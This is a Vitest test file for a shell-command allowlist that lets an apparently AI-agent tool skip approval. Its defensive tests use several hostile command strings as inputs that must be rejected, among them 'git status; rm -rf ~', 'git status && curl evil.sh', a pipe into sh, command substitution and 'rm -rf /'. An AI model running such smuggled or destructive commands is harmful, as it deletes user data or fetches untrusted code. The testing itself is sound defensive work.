/**
 * commandMatchesAllowlist: conservative prefix matching for the
 * run_shell_command approval skip. The dangerous cases are commands that
 * smuggle a second command past an allowlisted prefix.
 */

import { describe, expect, it } from 'vitest'
import { commandMatchesAllowlist } from '../../../src/main/tools/shell-allowlist'

describe('commandMatchesAllowlist', () => {
  it('matches an exact command and word-boundary continuations', () => {
    expect(commandMatchesAllowlist('npm test', ['npm test'])).toBe(true)
    expect(commandMatchesAllowlist('npm test -- --watch', ['npm test'])).toBe(true)
    expect(commandMatchesAllowlist('  npm   test  ', ['npm test'])).toBe(true)
  })

  it('does not match mid-word continuations', () => {
    expect(commandMatchesAllowlist('npm tests', ['npm test'])).toBe(false)
    expect(commandMatchesAllowlist('npm testify run', ['npm test'])).toBe(false)
  })

  it('never matches commands with chaining/substitution characters', () => {
    expect(commandMatchesAllowlist('git status; rm -rf ~', ['git status'])).toBe(false)
    expect(commandMatchesAllowlist('git status && curl evil.sh', ['git status'])).toBe(false)
    expect(commandMatchesAllowlist('git status | sh', ['git status'])).toBe(false)
    expect(commandMatchesAllowlist('git status `whoami`', ['git status'])).toBe(false)
    expect(commandMatchesAllowlist('git status $(whoami)', ['git status'])).toBe(false)
    expect(commandMatchesAllowlist('git status > secrets.txt', ['git status'])).toBe(false)
    expect(commandMatchesAllowlist('git status\nrm -rf ~', ['git status'])).toBe(false)
  })

  it('ignores empty entries and empty commands', () => {
    expect(commandMatchesAllowlist('anything', [''])).toBe(false)
    expect(commandMatchesAllowlist('', ['npm test'])).toBe(false)
    expect(commandMatchesAllowlist('   ', ['npm test'])).toBe(false)
  })

  it('checks every entry in the list', () => {
    const list = ['npm test', 'git status', 'npx vitest run']
    expect(commandMatchesAllowlist('git status --short', list)).toBe(true)
    expect(commandMatchesAllowlist('npx vitest run tests/unit/x.test.ts', list)).toBe(true)
    expect(commandMatchesAllowlist('rm -rf /', list)).toBe(false)
  })
})
